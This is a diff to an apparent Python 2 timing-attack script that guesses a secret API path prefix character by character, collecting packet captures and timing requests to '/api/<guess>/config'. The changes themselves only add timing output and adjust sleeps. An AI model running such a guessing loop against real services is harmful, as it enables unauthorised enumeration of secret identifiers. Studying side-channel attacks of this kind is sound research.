@@ -69,6 +69,7 @@ else:
 count = -1  # hack to parse data first. This lets us restart the process. Sorta
 start_time = time.time()
 interval = start_time
+guess_time = start_time
 username_generators = []
 def make_username_generators(current_guess):
     results = []
@@ -76,12 +77,12 @@ def make_username_generators(current_guess):
         results.append(users.generate_username(current_guess + next_guess))
     return results
 
-#username_generators = make_username_generators(current_guess)
 next_guess = current_guess
 print "CURRENT_GUESS: ", current_guess
 print "Collecting data:"
 while True:
     if next_guess == current_guess:
+        guess_time = time.time()
         print "Making new username generators with prefix:", current_guess
         username_generators = make_username_generators(current_guess)
         next_guess = None
@@ -102,15 +103,16 @@ while True:
         if count % 100 == 0:
             now = time.time()
             elapsed = now - start_time
-            print count, elapsed, 100 / (now - interval)
+            print "{} {:2f} {:2f}".format(
+                count, elapsed, 100 / (now - interval))
             interval = now
             if count % 3000 == 0:
-                time.sleep(0.3) # let any existing connections finish
+                time.sleep(0.1) # let any existing connections finish
                 print "Current guess: ", current_guess
-                print "Parsing data:"
+                print "Parsing data..."
                 subprocess.call(
                     './parse_pcap.py data/*.pcap', shell=True) # I know, I know
-                print "Calculating next guess:"
+                print "Calculating next guess..."
                 data = results.read_data(
                     bucket=r'^/api/(%s\w)\w+/config$' % current_guess,
                     data_dir='data')
@@ -118,6 +120,7 @@ while True:
                 if next_guess is not None:
                     current_guess = next_guess
                     print "CHANGING GUESS: ", current_guess
+                    print "Guess time: ", time.time() - guess_time
                     subprocess.call('make clean', shell=True)  # dump old data
                 print "Collecting data:"
         time.sleep(0.005)
